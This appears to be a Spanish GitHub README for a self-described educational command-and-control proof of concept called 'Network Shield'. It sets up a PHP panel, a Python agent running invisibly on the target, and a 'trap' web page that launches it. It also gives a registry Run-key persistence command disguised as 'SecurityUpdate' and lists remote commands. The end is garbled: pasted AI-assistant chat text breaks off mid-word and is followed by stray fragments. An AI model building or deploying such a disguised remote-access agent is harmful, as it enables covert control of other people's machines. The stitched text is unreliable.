# 🛡️ Network Shield - Remote Administration System (PoC)

Este proyecto es una **Prueba de Concepto (PoC)** diseñada para estudiar el funcionamiento de los sistemas de administración remota (C2) y las técnicas de persistencia en entornos Windows.

> **⚠️ AVISO LEGAL:** Este software ha sido creado exclusivamente con fines educativos y de investigación en ciberseguridad. El autor no se hace responsable del mal uso de este código. El uso en sistemas sin autorización es ilegal.

---

## 🛠️ Requisitos del Sistema

* **XAMPP**: Servidor Apache y MySQL (MariaDB).
* **Python 3.x**: Instalado y con la librería `requests` (`pip install requests`).
* **Base de Datos**: Importar el esquema incluido en `server/db.txt`.

---

## 🚀 Guía de Instalación y Configuración

### 1. Preparación de la Base de Datos
1. Inicia **Apache** y **MySQL** desde el panel de XAMPP.
2. Accede a `http://localhost/phpmyadmin`.
3. Crea una base de datos llamada `network_shield_db`.
4. Importa el contenido de `server/db.txt` en la pestaña **SQL**.

### 2. Configuración del Servidor Web
1. Coloca la carpeta completa `Network-Shield-System` dentro de `C:\xampp\htdocs\`.
2. El panel será accesible en: `http://localhost/Network-Shield-System/server/index.php`.

---

## 📡 Ejecución y Pruebas

Para establecer una conexión exitosa, sigue este orden:

1.  **Iniciar el Receptor (Master)**: Abre una terminal en la carpeta `master/` y ejecuta:
    ```bash
    python receptor.py
    ```
2.  **Lanzar el Agente (Client)**:
    * **Manual**: Ejecutar `python client/agente.py`.
    * **Simulación Web**: Acceder vía navegador a: `http://localhost/Network-Shield-System/server/trampa.php`

---

## 🔐 Implementación de Persistencia

La persistencia permite que el agente se ejecute automáticamente cada vez que el usuario inicie sesión en Windows.

1. Instalación (Crear la persistencia)
Envía este comando desde la terminal del receptor (ajusta la ruta según la ubicación real del archivo):

DOS

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "pythonw.exe C:\xampp\htdocs\Network-Shield-System\client\agente.pyw" /f
2. Comprobación (Verificar estado)
Para confirmar que el registro se ha creado correctamente, ejecuta:

DOS

reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate"
3. Eliminación (Limpieza del Sistema)Para desactivar el inicio automático y dejar el sistema limpio, ejecuta:DOSreg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /f
📂 Estructura del RepositorioCarpetaArchivo PrincipalDescripciónserver/index.phpPanel web, API de reporte y gestión de comandos.client/agente.pyScript que se ejecuta en el objetivo (modo invisible).master/receptor.pyTerminal C2 interactiva para el administrador.📋 Comandos de Prueba DisponiblesUna vez establecida la conexión en el receptor, puedes utilizar:💻 Información: whoami, systeminfo, ipconfig.📂 Navegación: dir, cd .., cd [ruta].🌐 Interacción: start https://google.com, msg * "Aviso de Seguridad".🚪 Finalizar: exit (Cierra la sesión del agente de forma segura).🛠️ Troubleshooting (Solución de Problemas)[!IMPORTANT]Error de Conexión: Verifica que el puerto 4444 no esté bloqueado por el Firewall de Windows.Agente invisible en la Web: Asegúrate de que la URL en agente.py coincida con tu ruta en XAMPP.Error de MySQL: Verifica que el usuario sea root y la base de datos network_shield_db exista.🔄 Registro de CambiosRutas: Actualizadas a /Network-Shield-System/server/.Estructura: Migrada a un sistema modular de tres carpetas independientes.Persistencia: Comando optimizado para ejecución silenciosa con pythonw.exe.
---

### ¿Por qué esta versión es mejor?
* **Legibilidad**: Al usar tablas y bloques separados, el ojo humano encuentra la información más rápido.
* **GitHub-Ready**: He usado etiquetas como `[!IMPORTANT]`, que en GitHub generan cuadros de colores muy llamativos para el Troubleshooting.
* **Limpieza**: He eliminado texto repetitivo para que el usuario vaya directo a la acción.

**¿Te gustaría que generemos ahora un archivo `install.bat` automático para que no tengas que escri.
2. 🔑 **Persistencia**: Comando de registro actualizado para apuntar a la nueva ruta de XAMPP.
3. 🔧 **Sección de Soporte**: Añadida para dar respuesta a errores comunes de configuración.
